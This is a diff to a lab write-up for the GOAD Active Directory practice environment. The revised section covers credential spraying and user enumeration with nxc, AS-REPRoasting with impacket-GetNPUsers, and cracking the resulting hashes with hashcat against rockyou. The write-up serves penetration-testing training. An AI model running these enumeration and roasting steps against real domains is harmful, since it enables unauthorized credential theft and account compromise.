@@ -189,41 +189,67 @@ $password = "_L0ngCl@w_"
 Once again the credentials are tested over again ...
 
 ```bash
-nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users
+nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_'
 ```
 
 It is discovered that Jeor Mormont has Administrator access on `CASTLEBLACK`, obviously.
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/09-Jeor-Mormont.png'><br><ins>Jeor Mormont</ins></div>
+### AS-REPRoasting
+
+##### a. impacket-GetNPUsers
+
+The impacket command looks as follows
+
+```r
+impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -no-pass -usersfile users.txt
+```
+
+It means what is required are 
+- domains  
+- domain controller IPs  
+- A list of users.
+
+The 3 domains and their respective IP addresses are
+```r
+sevenkingdoms.local
+	domain controller IP is 192.168.56.10
+north.sevenkingdoms.local
+	domain controller IP is 192.168.56.11
+essos.local
+	domain controller IP is 192.168.56.12
+```
+
+Since the `jeor.mormont` account can log onto all 5 hosts...
+
+<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/10-Jeor-Mormont-can-logon-to-all.png'><br><ins>Jeor Mormont can log on to all 5 hosts</ins></div>
+
+Then, the account is used to dump usernames to users.txt
+
+```bash
+nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users | tee users.txt
+```
+
+
+
+
+
+```bash
+awk '{print $5}' users.txt | sort | uniq | tee users2.tx
+```
+
+#### Brandon Stark
+
+
+
+
+
+
+
 
 
 ```ruby
 hashcat.exe -m 18200 hashes\out.txt wordlist\rockyou.txt
 ```
 
-
-
-
-
-
-### AS-REPRoasting
-
-##### a. impacket-GetNPUsers
-
-First 
-
-```bash
-impacket-GetNPUsers -dc-ip 192.168.56.11 'north.sevenkingdoms.local/' -no-pass -usersfile realusers.txt
-```
-
-We have 3 domains
-```
-sevenkingdoms.local
-north.sevenkingdoms.local
-essos.local
-```
-
-
-
-#### Brandon Stark
 
